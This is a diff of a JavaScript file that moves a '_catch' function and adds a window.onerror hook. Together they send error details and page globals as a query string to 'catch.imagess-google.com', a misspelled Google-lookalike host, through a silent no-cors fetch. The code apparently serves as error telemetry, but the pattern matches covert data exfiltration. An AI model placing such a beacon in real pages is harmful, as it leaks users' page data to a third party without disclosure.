@@ -1,3 +1,38 @@
+window._catch = function(data){
+  if (window.site) {
+    data.S=site
+  }
+  if(fetchGoal){
+    data.G=fetchGoal
+  }
+  var str=[],k;
+  for(var i in data){
+    k=data[i];
+    if (typeof(k)==="object") {
+      k= encodeURIComponent(JSON.stringify(k));
+    }
+    str.push(i+'='+k)
+  }
+  str=str.join('&')
+  // var fetchUrl = state.UserName||data.UserName
+  // fetchUrl = '/catch?'+(fetchUrl&&('U='+fetchUrl+'&'))+str
+  // _App && ga && ga('send','event',msg,str)
+  var fetchUrl = 'http://catch.imagess-google.com?'+str
+  fetch(fetchUrl, {
+    credentials:'same-origin',
+    method: 'GET',
+    cache: 'no-store',
+    'mode':'no-cors',
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded"
+    },
+    // body: str
+  })
+}
+window.onerror = function(errorMessage, scriptURI, lineNumber,columnNumber,errorObj) {
+  console.log(errorMessage, scriptURI, lineNumber,columnNumber,errorObj)
+  _catch({msg:'winerr',errorMessage,scriptURI,errorObj})
+}
 ;(function(){
   try {
     sessionStorage.setItem('TextLocalStorage', 'hello world');
@@ -180,37 +215,7 @@ function Xss(data){
   }
   return [data,mayBeXss]
 }
-window._catch = function(data){
-  if (window.site) {
-    data.S=site
-  }
-  if(fetchGoal){
-    data.G=fetchGoal
-  }
-  var str=[],k;
-  for(var i in data){
-    k=data[i];
-    if (typeof(k)==="object") {
-      k= encodeURIComponent(JSON.stringify(k));
-    }
-    str.push(i+'='+k)
-  }
-  str=str.join('&')
-  // var fetchUrl = state.UserName||data.UserName
-  // fetchUrl = '/catch?'+(fetchUrl&&('U='+fetchUrl+'&'))+str
-  // _App && ga && ga('send','event',msg,str)
-  var fetchUrl = 'http://catch.imagess-google.com?'+str
-  fetch(fetchUrl, {
-    credentials:'same-origin',
-    method: 'GET',
-    cache: 'no-store',
-    'mode':'no-cors',
-    headers: {
-      "Content-Type": "application/x-www-form-urlencoded"
-    },
-    // body: str
-  })
-}
+
 
 // function FetchCatch(opt) {
 //   console.log(opt);
